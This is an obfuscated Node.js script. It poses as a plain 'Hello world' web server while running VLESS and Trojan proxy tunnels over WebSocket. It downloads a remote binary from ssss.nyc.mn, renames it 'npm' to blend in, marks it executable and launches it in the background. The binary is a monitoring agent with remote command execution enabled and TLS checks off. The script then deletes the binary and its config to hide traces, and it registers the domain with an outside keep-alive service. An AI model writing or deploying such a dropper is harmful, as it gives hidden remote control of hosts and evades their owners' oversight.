const _0x57545a=_0x3494;function _0x3494(_0x2ccf79,_0x4088a3){_0x2ccf79=_0x2ccf79-0xd7;const _0x746375=_0x7463();let _0x349454=_0x746375[_0x2ccf79];return _0x349454;}function _0x7463(){const _0x35330c=['send','substr','from','concat','trojan://','map','56d29422-096b-4233-9a84-0ae360d3c606','DOMAIN','url','replace','end','698189cGhFHt','finish','8.8.4.4','env','NEZHA_SERVER','false','readUInt16BE','join','1.1.1.1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','hex','utf8','length','&type=A','arm64','NAME','slice','PORT','child_process','sub','SUB_PATH','Unknown','test','https://arm64.ssss.nyc.mn/v1','1136184rADSNM','setsid\x20nohup\x20./npm\x20-s\x20','sha224','npm\x20running\x20error:','WSPATH','close','application/json','pipe','Status','log','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','toString','NEZHA_PORT','/bin/bash','get','trim','https://arm64.ssss.nyc.mn/agent','decode','connection','base64','arm','then','config.yaml','https://api.ip.sb/geoip','data','includes','&path=%2F','Automatic\x20Access\x20Task\x20added\x20successfully','once','https://','npm\x20download\x20successfully','axios','error:\x20','application/dns-json','connect','2053','buffer','Answer','index.html','2087','write','writeHead','Server\x20is\x20running\x20on\x20port\x20','arch','writeFileSync','Failed\x20to\x20resolve\x20','https://amd64.ssss.nyc.mn/v1','8443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20with\x20all\x20DNS\x20servers','error','isp','5850369WNiWHT','digest','Hello\x20world!','Not\x20Found\x0a',':443?encryption=none&security=tls&sni=','readUInt8','4ZrcoPq','text/plain','aarch64','split','vless://','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','update','4305852VXSdPB','stream','&fp=chrome&type=ws&host=','UUID','catch','crypto','type','1795445khgmLh','readFile','reduce','every','chmod\x20+x\x20npm','unlink','443','9IpgNfb','post','AUTO_ACCESS','message','createWriteStream','path','https://amd64.ssss.nyc.mn/agent','text/html','npm',':443?security=tls&sni=','1554156XoRqEh','net','https://dns.google/resolve?name=','15267976mcXUOG'];_0x7463=function(){return _0x35330c;};return _0x7463();}(function(_0x40f4fc,_0x2c55e9){const _0x564d0e=_0x3494,_0x448660=_0x40f4fc();while(!![]){try{const _0x363087=-parseInt(_0x564d0e(0x121))/0x1+parseInt(_0x564d0e(0x112))/0x2+parseInt(_0x564d0e(0x13b))/0x3+-parseInt(_0x564d0e(0xf3))/0x4*(parseInt(_0x564d0e(0x101))/0x5)+-parseInt(_0x564d0e(0xfa))/0x6+-parseInt(_0x564d0e(0xed))/0x7+-parseInt(_0x564d0e(0x115))/0x8*(-parseInt(_0x564d0e(0x108))/0x9);if(_0x363087===_0x2c55e9)break;else _0x448660['push'](_0x448660['shift']());}catch(_0x63d131){_0x448660['push'](_0x448660['shift']());}}}(_0x7463,0x6ebf0));const os=require('os'),http=require(_0x57545a(0x145)),fs=require('fs'),axios=require(_0x57545a(0xd8)),net=require(_0x57545a(0x113)),path=require(_0x57545a(0x10d)),crypto=require(_0x57545a(0xff)),{Buffer}=require(_0x57545a(0xdd)),{exec,execSync}=require(_0x57545a(0x135)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x57545a(0x124)][_0x57545a(0xfd)]||_0x57545a(0x11c),NEZHA_SERVER=process[_0x57545a(0x124)][_0x57545a(0x125)]||'',NEZHA_PORT=process[_0x57545a(0x124)][_0x57545a(0x148)]||'',NEZHA_KEY=process[_0x57545a(0x124)][_0x57545a(0x12b)]||'',DOMAIN=process[_0x57545a(0x124)][_0x57545a(0x11d)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x57545a(0x10a)]||!![],WSPATH=process[_0x57545a(0x124)][_0x57545a(0x13f)]||UUID[_0x57545a(0x133)](0x0,0x8),SUB_PATH=process[_0x57545a(0x124)][_0x57545a(0x137)]||_0x57545a(0x136),NAME=process[_0x57545a(0x124)][_0x57545a(0x132)]||'',PORT=process[_0x57545a(0x124)][_0x57545a(0x134)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4998fd=_0x57545a;try{const _0x8f67d6=await axios[_0x4998fd(0x14a)](_0x4998fd(0x153)),_0x3921b9=_0x8f67d6[_0x4998fd(0x154)];ISP=(_0x3921b9['country_code']+'-'+_0x3921b9[_0x4998fd(0xec)])['replace'](/ /g,'_');}catch(_0x50754e){ISP=_0x4998fd(0x138);}};GetISP();const httpServer=http['createServer']((_0x319b75,_0x3eeeb4)=>{const _0x258b7c=_0x57545a;if(_0x319b75[_0x258b7c(0x11e)]==='/'){const _0x3946e9=path['join'](__dirname,_0x258b7c(0xdf));fs[_0x258b7c(0x102)](_0x3946e9,_0x258b7c(0x12e),(_0x17539a,_0x3be8b3)=>{const _0x1ccb8b=_0x258b7c;if(_0x17539a){_0x3eeeb4[_0x1ccb8b(0xe2)](0xc8,{'Content-Type':'text/html'}),_0x3eeeb4['end'](_0x1ccb8b(0xef));return;}_0x3eeeb4[_0x1ccb8b(0xe2)](0xc8,{'Content-Type':_0x1ccb8b(0x10f)}),_0x3eeeb4['end'](_0x3be8b3);});return;}else{if(_0x319b75[_0x258b7c(0x11e)]==='/'+SUB_PATH){const _0x1b871e=NAME?NAME+'-'+ISP:ISP,_0x50cc2b=_0x258b7c(0xf7)+UUID+'@'+DOMAIN+_0x258b7c(0xf1)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x258b7c(0x156)+WSPATH+'#'+_0x1b871e,_0x4eb72c=_0x258b7c(0x11a)+UUID+'@'+DOMAIN+_0x258b7c(0x111)+DOMAIN+_0x258b7c(0xfc)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x1b871e,_0x50d16e=_0x50cc2b+'\x0a'+_0x4eb72c,_0x1402c8=Buffer[_0x258b7c(0x118)](_0x50d16e)['toString'](_0x258b7c(0x14f));_0x3eeeb4['writeHead'](0xc8,{'Content-Type':_0x258b7c(0xf4)}),_0x3eeeb4[_0x258b7c(0x120)](_0x1402c8+'\x0a');}else _0x3eeeb4['writeHead'](0x194,{'Content-Type':_0x258b7c(0xf4)}),_0x3eeeb4['end'](_0x258b7c(0xf0));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x57545a(0x11f)](/-/g,''),DNS_SERVERS=[_0x57545a(0x123),_0x57545a(0x129)];function resolveHost(_0x2ed2b9){return new Promise((_0x111595,_0x3ed50c)=>{const _0x30df96=_0x3494;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x30df96(0x139)](_0x2ed2b9)){_0x111595(_0x2ed2b9);return;}let _0x57ac7e=0x0;function _0x46a64a(){const _0x5ca0d0=_0x30df96;if(_0x57ac7e>=DNS_SERVERS['length']){_0x3ed50c(new Error(_0x5ca0d0(0xe6)+_0x2ed2b9+_0x5ca0d0(0xea)));return;}const _0x424a56=DNS_SERVERS[_0x57ac7e];_0x57ac7e++;const _0x122823=_0x5ca0d0(0x114)+encodeURIComponent(_0x2ed2b9)+_0x5ca0d0(0x130);axios[_0x5ca0d0(0x14a)](_0x122823,{'timeout':0x1388,'headers':{'Accept':_0x5ca0d0(0xda)}})[_0x5ca0d0(0x151)](_0x3722d9=>{const _0x4daf2b=_0x5ca0d0,_0x36c3dd=_0x3722d9[_0x4daf2b(0x154)];if(_0x36c3dd[_0x4daf2b(0x143)]===0x0&&_0x36c3dd[_0x4daf2b(0xde)]&&_0x36c3dd[_0x4daf2b(0xde)][_0x4daf2b(0x12f)]>0x0){const _0x68b2d3=_0x36c3dd[_0x4daf2b(0xde)]['find'](_0x552ca1=>_0x552ca1[_0x4daf2b(0x100)]===0x1);if(_0x68b2d3){_0x111595(_0x68b2d3[_0x4daf2b(0x154)]);return;}}_0x46a64a();})[_0x5ca0d0(0xfe)](_0x1a20e4=>{_0x46a64a();});}_0x46a64a();});}function handleVlessConnection(_0x360435,_0x4b4e1e){const _0x48080c=_0x57545a,[_0x360cfe]=_0x4b4e1e,_0x4afbb8=_0x4b4e1e[_0x48080c(0x133)](0x1,0x11);if(!_0x4afbb8[_0x48080c(0x104)]((_0xedd501,_0x32da38)=>_0xedd501==parseInt(uuid[_0x48080c(0x117)](_0x32da38*0x2,0x2),0x10)))return![];let _0xcb6ba3=_0x4b4e1e[_0x48080c(0x133)](0x11,0x12)[_0x48080c(0xf2)]()+0x13;const _0x4587e8=_0x4b4e1e['slice'](_0xcb6ba3,_0xcb6ba3+=0x2)[_0x48080c(0x127)](0x0),_0x238caa=_0x4b4e1e[_0x48080c(0x133)](_0xcb6ba3,_0xcb6ba3+=0x1)['readUInt8'](),_0x2a9fe=_0x238caa==0x1?_0x4b4e1e[_0x48080c(0x133)](_0xcb6ba3,_0xcb6ba3+=0x4)[_0x48080c(0x128)]('.'):_0x238caa==0x2?new TextDecoder()[_0x48080c(0x14d)](_0x4b4e1e['slice'](_0xcb6ba3+0x1,_0xcb6ba3+=0x1+_0x4b4e1e['slice'](_0xcb6ba3,_0xcb6ba3+0x1)[_0x48080c(0xf2)]())):_0x238caa==0x3?_0x4b4e1e[_0x48080c(0x133)](_0xcb6ba3,_0xcb6ba3+=0x10)['reduce']((_0x65bda1,_0x23658c,_0x361e5b,_0x50afdf)=>_0x361e5b%0x2?_0x65bda1[_0x48080c(0x119)](_0x50afdf['slice'](_0x361e5b-0x1,_0x361e5b+0x1)):_0x65bda1,[])['map'](_0x4caf81=>_0x4caf81[_0x48080c(0x127)](0x0)[_0x48080c(0x147)](0x10))['join'](':'):'';_0x360435[_0x48080c(0x116)](new Uint8Array([_0x360cfe,0x0]));const _0x318d42=createWebSocketStream(_0x360435);return resolveHost(_0x2a9fe)[_0x48080c(0x151)](_0x5de1e2=>{const _0x270535=_0x48080c;net[_0x270535(0xdb)]({'host':_0x5de1e2,'port':_0x4587e8},function(){const _0x4a1e85=_0x270535;this['write'](_0x4b4e1e[_0x4a1e85(0x133)](_0xcb6ba3)),_0x318d42['on'](_0x4a1e85(0xeb),()=>{})[_0x4a1e85(0x142)](this)['on'](_0x4a1e85(0xeb),()=>{})[_0x4a1e85(0x142)](_0x318d42);})['on'](_0x270535(0xeb),()=>{});})[_0x48080c(0xfe)](_0x1b1e9b=>{const _0x20d6c8=_0x48080c;net[_0x20d6c8(0xdb)]({'host':_0x2a9fe,'port':_0x4587e8},function(){const _0x434a7a=_0x20d6c8;this[_0x434a7a(0xe1)](_0x4b4e1e['slice'](_0xcb6ba3)),_0x318d42['on']('error',()=>{})[_0x434a7a(0x142)](this)['on'](_0x434a7a(0xeb),()=>{})['pipe'](_0x318d42);})['on'](_0x20d6c8(0xeb),()=>{});}),!![];}function handleTrojanConnection(_0x552284,_0x329111){const _0xed373e=_0x57545a;try{if(_0x329111[_0xed373e(0x12f)]<0x3a)return![];const _0x481007=_0x329111[_0xed373e(0x133)](0x0,0x38)['toString'](),_0x3f3334=[UUID];let _0x40c75f=null;for(const _0x5b2437 of _0x3f3334){const _0x3e541d=crypto['createHash'](_0xed373e(0x13d))[_0xed373e(0xf9)](_0x5b2437)[_0xed373e(0xee)](_0xed373e(0x12d));if(_0x3e541d===_0x481007){_0x40c75f=_0x5b2437;break;}}if(!_0x40c75f)return![];let _0x65f31d=0x38;_0x329111[_0x65f31d]===0xd&&_0x329111[_0x65f31d+0x1]===0xa&&(_0x65f31d+=0x2);const _0x584518=_0x329111[_0x65f31d];if(_0x584518!==0x1)return![];_0x65f31d+=0x1;const _0x33a11e=_0x329111[_0x65f31d];_0x65f31d+=0x1;let _0x40a854,_0x4a45a0;if(_0x33a11e===0x1)_0x40a854=_0x329111[_0xed373e(0x133)](_0x65f31d,_0x65f31d+0x4)[_0xed373e(0x128)]('.'),_0x65f31d+=0x4;else{if(_0x33a11e===0x3){const _0x1c8b3b=_0x329111[_0x65f31d];_0x65f31d+=0x1,_0x40a854=_0x329111[_0xed373e(0x133)](_0x65f31d,_0x65f31d+_0x1c8b3b)['toString'](),_0x65f31d+=_0x1c8b3b;}else{if(_0x33a11e===0x4)_0x40a854=_0x329111[_0xed373e(0x133)](_0x65f31d,_0x65f31d+0x10)[_0xed373e(0x103)]((_0x5da3c6,_0x7f8587,_0x28c8c2,_0x377eba)=>_0x28c8c2%0x2?_0x5da3c6[_0xed373e(0x119)](_0x377eba[_0xed373e(0x133)](_0x28c8c2-0x1,_0x28c8c2+0x1)):_0x5da3c6,[])[_0xed373e(0x11b)](_0x41dec8=>_0x41dec8[_0xed373e(0x127)](0x0)[_0xed373e(0x147)](0x10))[_0xed373e(0x128)](':'),_0x65f31d+=0x10;else return![];}}_0x4a45a0=_0x329111['readUInt16BE'](_0x65f31d),_0x65f31d+=0x2;_0x65f31d<_0x329111[_0xed373e(0x12f)]&&_0x329111[_0x65f31d]===0xd&&_0x329111[_0x65f31d+0x1]===0xa&&(_0x65f31d+=0x2);const _0x36a8c0=createWebSocketStream(_0x552284);return resolveHost(_0x40a854)[_0xed373e(0x151)](_0x1b3a8d=>{const _0x269f9f=_0xed373e;net[_0x269f9f(0xdb)]({'host':_0x1b3a8d,'port':_0x4a45a0},function(){const _0x46a47d=_0x269f9f;_0x65f31d<_0x329111['length']&&this[_0x46a47d(0xe1)](_0x329111[_0x46a47d(0x133)](_0x65f31d)),_0x36a8c0['on'](_0x46a47d(0xeb),()=>{})[_0x46a47d(0x142)](this)['on']('error',()=>{})[_0x46a47d(0x142)](_0x36a8c0);})['on']('error',()=>{});})[_0xed373e(0xfe)](_0x534a01=>{const _0x516024=_0xed373e;net[_0x516024(0xdb)]({'host':_0x40a854,'port':_0x4a45a0},function(){const _0xa6dfab=_0x516024;_0x65f31d<_0x329111[_0xa6dfab(0x12f)]&&this[_0xa6dfab(0xe1)](_0x329111[_0xa6dfab(0x133)](_0x65f31d)),_0x36a8c0['on'](_0xa6dfab(0xeb),()=>{})[_0xa6dfab(0x142)](this)['on'](_0xa6dfab(0xeb),()=>{})[_0xa6dfab(0x142)](_0x36a8c0);})['on'](_0x516024(0xeb),()=>{});}),!![];}catch(_0x4700b2){return![];}}wss['on'](_0x57545a(0x14e),(_0xd02489,_0x3a505e)=>{const _0x4ee17d=_0x57545a,_0x383b41=_0x3a505e['url']||'';_0xd02489[_0x4ee17d(0x158)](_0x4ee17d(0x10b),_0x3fb7ef=>{const _0x5eb3e7=_0x4ee17d;if(_0x3fb7ef['length']>0x11&&_0x3fb7ef[0x0]===0x0){const _0x4a3957=_0x3fb7ef[_0x5eb3e7(0x133)](0x1,0x11),_0x18bd51=_0x4a3957[_0x5eb3e7(0x104)]((_0x2d0c95,_0x2590fd)=>_0x2d0c95==parseInt(uuid[_0x5eb3e7(0x117)](_0x2590fd*0x2,0x2),0x10));if(_0x18bd51){!handleVlessConnection(_0xd02489,_0x3fb7ef)&&_0xd02489['close']();return;}}!handleTrojanConnection(_0xd02489,_0x3fb7ef)&&_0xd02489[_0x5eb3e7(0x140)]();})['on'](_0x4ee17d(0xeb),()=>{});});const getDownloadUrl=()=>{const _0x3315c7=_0x57545a,_0x3e7f58=os[_0x3315c7(0xe4)]();return _0x3e7f58===_0x3315c7(0x150)||_0x3e7f58===_0x3315c7(0x131)||_0x3e7f58===_0x3315c7(0xf5)?!NEZHA_PORT?_0x3315c7(0x13a):_0x3315c7(0x14c):!NEZHA_PORT?_0x3315c7(0xe7):_0x3315c7(0x10e);},downloadFile=async()=>{const _0x28f708=_0x57545a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x18a016=getDownloadUrl(),_0x5db34e=await axios({'method':_0x28f708(0x14a),'url':_0x18a016,'responseType':_0x28f708(0xfb)}),_0x27ec89=fs[_0x28f708(0x10c)](_0x28f708(0x110));return _0x5db34e[_0x28f708(0x154)][_0x28f708(0x142)](_0x27ec89),new Promise((_0x19ba10,_0x2995ee)=>{const _0x5b1d7c=_0x28f708;_0x27ec89['on'](_0x5b1d7c(0x122),()=>{const _0x507747=_0x5b1d7c;console[_0x507747(0x144)](_0x507747(0xd7)),exec(_0x507747(0x105),_0x8895e=>{if(_0x8895e)_0x2995ee(_0x8895e);_0x19ba10();});}),_0x27ec89['on'](_0x5b1d7c(0xeb),_0x2995ee);});}catch(_0x4daa31){throw _0x4daa31;}},runnz=async()=>{const _0x7a1d06=_0x57545a;try{const _0x4569ae=execSync(_0x7a1d06(0x12a),{'encoding':'utf-8'});if(_0x4569ae[_0x7a1d06(0x14b)]()!==''){console[_0x7a1d06(0x144)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3f14c9){}await downloadFile();let _0x469c51='',_0x7df70a=[_0x7a1d06(0x107),_0x7a1d06(0xe8),'2096',_0x7a1d06(0xe0),'2083',_0x7a1d06(0xdc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d072d=_0x7df70a[_0x7a1d06(0x155)](NEZHA_PORT)?'--tls':'';_0x469c51=_0x7a1d06(0x13c)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4d072d+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4e909a=NEZHA_SERVER[_0x7a1d06(0x155)](':')?NEZHA_SERVER[_0x7a1d06(0xf6)](':')['pop']():'',_0x14c3b1=_0x7df70a['includes'](_0x4e909a)?'true':_0x7a1d06(0x126),_0x1469d0='client_secret:\x20'+NEZHA_KEY+_0x7a1d06(0xe9)+NEZHA_SERVER+_0x7a1d06(0x146)+_0x14c3b1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x7a1d06(0xe5)](_0x7a1d06(0x152),_0x1469d0);}_0x469c51=_0x7a1d06(0x12c);}else{console[_0x7a1d06(0x144)](_0x7a1d06(0xf8));return;}}try{exec(_0x469c51,{'shell':_0x7a1d06(0x149)},_0x2ee75e=>{const _0x253302=_0x7a1d06;if(_0x2ee75e)console['error'](_0x253302(0x13e),_0x2ee75e);else console[_0x253302(0x144)]('npm\x20is\x20running');});}catch(_0x40068c){console[_0x7a1d06(0xeb)](_0x7a1d06(0xd9)+_0x40068c);}};async function addAccessTask(){const _0x38122f=_0x57545a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x451854=_0x38122f(0x159)+DOMAIN;try{const _0xad6309=await axios[_0x38122f(0x109)]('https://oooo.serv00.net/add-url',{'url':_0x451854},{'headers':{'Content-Type':_0x38122f(0x141)}});console[_0x38122f(0x144)](_0x38122f(0x157));}catch(_0x36a77d){}}const delFiles=()=>{const _0xa46015=_0x57545a;fs[_0xa46015(0x106)](_0xa46015(0x110),()=>{}),fs[_0xa46015(0x106)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x2e78d4=_0x57545a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2e78d4(0x144)](_0x2e78d4(0xe3)+PORT);});
